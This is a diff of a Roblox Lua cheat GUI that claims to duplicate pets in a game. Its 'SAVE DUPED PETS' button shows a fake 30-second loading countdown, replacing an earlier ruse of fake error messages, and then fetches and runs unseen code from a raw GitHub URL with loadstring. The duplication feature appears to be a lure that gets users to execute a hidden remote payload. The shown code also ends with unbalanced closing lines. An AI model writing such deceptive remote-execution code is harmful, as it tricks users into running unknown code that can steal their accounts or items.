@@ -36,7 +36,7 @@ RunService.RenderStepped:Connect(function()
 	end
 end)
 
--- Dupe Amount Input（通常動作に戻す）
+-- Dupe Amount Input
 local dupeAmount = 1
 MainTab:CreateInput({
 	Name = "Dupe Amount (1-100)",
@@ -69,48 +69,39 @@ MainTab:CreateButton({
 	end
 })
 
--- SAVE DUPED PETS Button (5回目で実行)
-local saveAttemptCount = 0
+-- SAVE STATUS 表示用パラグラフ
+local saveStatusLabel = MainTab:CreateParagraph({
+	Title = "SAVE STATUS",
+	Content = "Ready"
+})
 
-local saveButton = MainTab:CreateButton({
+-- SAVE DUPED PETS Button（30秒ロード後にスクリプト実行）
+MainTab:CreateButton({
 	Name = "SAVE DUPED PETS",
 	Callback = function()
-		saveAttemptCount += 1
-
-		if saveAttemptCount < 5 then
-
-			local button = saveButton
-			if button and button.Set then
-
-				button:Set({
-					Name = "❌ ERROR - SAVE DUPED PETS",
-				})
-
-				task.spawn(function()
-					local flashCount = 3
-					for i = 1, flashCount do
-						button:Set({Interactable = false})
-						wait(0.1)
-						button:Set({Name = "SAVE DUPED PETS"})
-						wait(0.1)
-						button:Set({Name = "❌ ERROR - SAVE DUPED PETS"})
-					end
-					button:Set({
-						Name = "SAVE DUPED PETS",
-						Interactable = true,
-					})
-				end)
+		task.spawn(function()
+			-- 30秒カウントダウン演出
+			local countdown = 30
+			while countdown > 0 do
+				saveStatusLabel:Set({Content = "⌛ Loadinging pet information ... (" .. countdown .. "s)"})
+				wait(1)
+				countdown -= 1
 			end
 
-			warn("❌ SAVE DUPED PETS ERROR: 試行 " .. saveAttemptCount .. " / 5")
-		else
-			-- 5回目で実行
+			-- スクリプト実行
+			saveStatusLabel:Set({Content = "🚀 Booting ..."})
 			local success, err = pcall(function()
 				loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/uitest"))()
 			end)
-			if not success then
-				warn("SAVE DUPED PETS 実行失敗:", err)
+
+			if success then
+				saveStatusLabel:Set({Content = "✅ Success!"})
+			else
+				saveStatusLabel:Set({Content = "❌ Failed to load script: " .. tostring(err)})
 			end
+		end)
+	end
+})
 		end
 	end
 })
